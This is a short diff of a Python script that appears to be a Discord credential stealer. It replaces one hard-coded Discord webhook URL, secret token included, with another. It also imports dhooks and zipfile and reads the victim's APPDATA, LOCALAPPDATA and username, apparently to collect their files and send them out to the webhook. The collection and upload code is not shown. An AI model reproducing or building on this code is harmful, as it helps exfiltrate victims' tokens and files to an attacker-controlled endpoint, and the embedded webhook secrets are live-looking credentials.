@@ -5,7 +5,7 @@ import zipfile
 from requests import get
 from dhooks import Webhook, File
 
-hook = Webhook('https://discordapp.com/api/webhooks/648226559475318800/zidOz3Ro9ZzMD_o1AqHtK05ULvYogTj2fgY_RIoPX03bgVuOdRF5OrZqIbJxLCpzQxWK')
+hook = Webhook('https://discord.com/api/webhooks/815729594594361364/6MtASbSn7Ee2Fxxp3pcKvYRhQEZQ4jVuROfI_wLG04mSVFg6QRbfMGqlSAju6ewW-B8L')
 path = os.getenv('APPDATA')
 localpath = os.getenv('LOCALAPPDATA')
 user = os.getenv('username')
